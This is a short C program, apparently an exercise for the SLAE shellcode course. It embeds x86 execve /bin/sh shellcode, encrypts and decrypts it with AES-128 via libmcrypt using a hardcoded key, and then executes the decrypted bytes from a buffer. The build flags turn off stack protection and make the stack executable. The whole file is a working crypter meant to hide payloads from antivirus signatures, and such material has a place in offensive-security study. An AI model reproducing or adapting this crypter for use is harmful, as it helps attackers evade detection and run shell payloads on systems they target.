/*
Compile using the following command:
$gcc aes_128_crypter.c -o aes_128_crypter -lmcrypt -fno-stack-protector -z execstack

Author: Nipun Jaswal (SLAE-1080)
*/

#include <stdio.h>
#include <string.h>
#include <mcrypt.h>

int main()
{
// Shellcode execve-stack
unsigned char * shellcode = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"
"\xe1\xb0\x0b\xcd\x80";
int shell_len = strlen(shellcode);

// Other Variables
char* i_vect = "AAAABBBBCCCCDDDD";
char *key = "wh4t1sloven0t1ng";
unsigned char buffer[32];
int count;

// Printing Unencrypted Shellcode
printf("\n[+] Shellcode Used:\n");
for ( count = 0; count < shell_len; count++)
{
printf("\\x%02x",shellcode[count]);
}

//Copy Shellcode on a 32 Byte Buffer
strncpy(buffer, shellcode, 32);

//Calling Encryption Function with Flag=0 , 32 is Length, 16 is Key Size
enc_dec(buffer, 32, i_vect, key,0);

//Printing Out Encrypted Shellcode Bytes
printf("\n\n[+] Encrypted Shellcode:\n");
for ( count = 0; count < 32; count++)
{
printf("\\x%02x",buffer[count]);
}

//Calling Decryption Function with Flag=1, 32 is the Length, 16 is Key Size
enc_dec(buffer, 32, i_vect, key,1);

//Printing Out Decrypted Shellcode Bytes
printf("\n\n[+] Decrypted Shellcode:\n");
for(count = 0; count < shell_len; count++)
{
printf("\\x%02x",buffer[count]);
}

//Calling Shellcode
printf("\n\nShellcode Length:  %d\n", strlen(buffer));
int (*ret)() = (int(*)())buffer;
ret();
return 0;
}
// Encryption Function
int enc_dec(void* buffer,int buffer_len,char* i_vect, char* key, int flag)
{
  // Mcrypt Object and Selecting the Crypto
  MCRYPT obj = mcrypt_module_open("rijndael-128", NULL, "cbc", NULL);
  mcrypt_generic_init(obj, key, 16, i_vect);
  if(flag==0)
  {
  printf("\n\n[+]Running Encryption...");
  //Encrypting the Shellcode
  mcrypt_generic(obj, buffer, buffer_len);
  }
  else if(flag==1)
  {
  printf("\n\n[+]Running Decryption...");
  //Decrypting the Shellcode
  mdecrypt_generic(obj, buffer, buffer_len);
  }
  mcrypt_generic_deinit (obj);
  mcrypt_module_close(obj);
  return 0;
}

